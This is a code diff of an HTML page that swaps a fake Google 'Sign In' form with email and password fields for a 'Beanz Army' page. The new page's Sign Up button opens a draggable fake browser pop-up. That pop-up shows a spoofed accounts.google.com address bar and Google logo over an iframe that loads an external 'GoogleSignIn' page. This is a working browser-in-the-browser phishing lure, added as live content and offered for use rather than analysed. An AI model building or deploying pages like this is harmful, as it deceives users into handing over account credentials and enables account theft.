@@ -3,118 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>Proxy</title>
     <style>
         body {
-            margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            font-family: 'Roboto', sans-serif;
-            background-color: #f0f0f0;
+            margin: 0;
             overflow: hidden;
-        }
-
-        main {
-            text-align: center;
+            background-image: url('https://tse4.mm.bing.net/th?id=OIP.2wb1SDygUYeqptrxfsTpEQHaEK&pid=Api&P=0&h=220');
         }
 
         header img {
-            height: 40px;
-            margin-bottom: 20px;
+            width: 25px;
+            height: 20px;
+        }
+
+        .wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: min-content;
+            width: min-content;
+            background-color: rgb(214, 214, 214);
+            border-radius: 20px;
+            padding: 20px;
+            position: fixed;
+            cursor: grab;
+            display: none;
+            z-index: 999999999;
+        }
+
+        .wrapper iframe {
+            height: 600px;
+            width: 475px;
+            border-radius: 20px;
+            border: none;
+            margin-top: 30px;
+            border: 2px solid #005eff;
+        }
+
+        .wrapper header {
+            width: 498px;
+            background-color: #f0f0f0;
+            padding: 10px;
+            cursor: grab;
+            user-select: none;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+        }
+
+        .wrapper header.active {
+            cursor: grabbing;
+        }
+
+        section {
+            background-color: rgba(255, 255, 255, 0.8);
+            width: 500px;
+            height: 300px;
+            border-radius: 25px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            z-index: 1;
         }
 
         h1 {
-            margin: 10px 0;
-            font-size: 24px;
-            font-weight: 500;
+            color: #005eff;
+            margin-bottom: 50px;
+            font-size: 45px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #005eff;
+            color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            background-color: #003f8e;
         }
 
         p {
             margin: 5px 0;
-            font-size: 16px;
-            color: #5f6368;
         }
 
-        form {
-            margin-top: 20px;
-        }
-
-        input {
-            height: 45px;
-            width: 400px;
-            margin: 10px auto;
-            border-radius: 8px;
-            border: 1px solid #dadce0;
-            padding: 0 15px;
-            box-sizing: border-box;
-            display: block;
-            font-size: 16px;
-        }
-
-        input::placeholder {
-            color: #5f6368;
-        }
-
-        a {
-            display: block;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #0c0064;
-            text-decoration: none;
-            text-align: left;
-            margin-left: 15px;
-            position: fixed;
+        p:last-child {
+            color: #005eff;
             cursor: pointer;
         }
 
-        button {
-            margin-top: 50px;
-            height: 40px;
-            width: 65px;
-            border: none;
-            border-radius: 8px;
-            background-color: #2825d7;
-            color: #fff;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            margin-left: 270px;
-        }
-
-        button:hover {
-            background-color: #3a79cb;
-        }
-
-        .error {
-            display: none;
-            color: red;
-            font-size: 17px;
-            margin-top: 7px;
+        p:last-child:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <main>
-        <header>
-            <img src="https://webstockreview.net/images/new-google-logo-png-1.png" alt="logo">
-            <h1>Sign In</h1>
-            <p>with your Google Account</p>
-        </header>
-        <form>
-            <input type="email" placeholder="Email">
-            <input type="password" placeholder="Password">
-            <p class="error">Incorrect Username or Password. Please try again.</p>
-            <a href="https://beanzman69.github.io/Phone/">Forgot Email or Password?</a>
-        </form>
-        <button onclick="next()">Next</button>
-    </main>
+    <div class="wrapper">
+        <header><img src="https://logos-world.net/wp-content/uploads/2020/09/Google-Symbol.png" alt="Logo :0">https://accounts.google.com/v2/h1IJGdj13nc5/</header>
+        <iframe src="https://beanzman69.github.io/GoogleSignIn/" frameborder="0"></iframe>
+    </div>
+    <section>
+        <h1>Beanz Army</h1>
+        <button onclick="GO()">Sign Up</button>
+        <p>Already have an Account?</p>
+        <p style="color: #005eff;">Log In</p>
+    </section>
     <script>
-        function next() {
-            const error = document.querySelector(".error");
-            error.style.display = "block";
+        document.addEventListener("DOMContentLoaded", () => {
+            const wrapper = document.querySelector(".wrapper");
+            const header = wrapper.querySelector("header");
+            let isDragging = false;
+            let initialX, initialY;
+            let offsetX = 0, offsetY = 0;
+
+            function onMouseDown(event) {
+                isDragging = true;
+                header.classList.add("active");
+                initialX = event.clientX - offsetX;
+                initialY = event.clientY - offsetY;
+            }
+
+            function onMouseMove(event) {
+                if (isDragging) {
+                    const newX = event.clientX - initialX;
+                    const newY = event.clientY - initialY;
+                    wrapper.style.left = `${newX}px`;
+                    wrapper.style.top = `${newY}px`;
+                    offsetX = event.clientX - newX;
+                    offsetY = event.clientY - newY;
+                }
+            }
+
+            function onMouseUp() {
+                isDragging = false;
+                header.classList.remove("active");
+            }
+
+            header.addEventListener("mousedown", onMouseDown);
+            document.addEventListener("mousemove", onMouseMove);
+            document.addEventListener("mouseup", onMouseUp);
+        });
+
+        function GO() {
+            const go = document.querySelector(".wrapper");
+            confirm('Allow this page to use sign in with google in a pop up window?')
+            go.style.display = "block";
         }
     </script>
 </body>
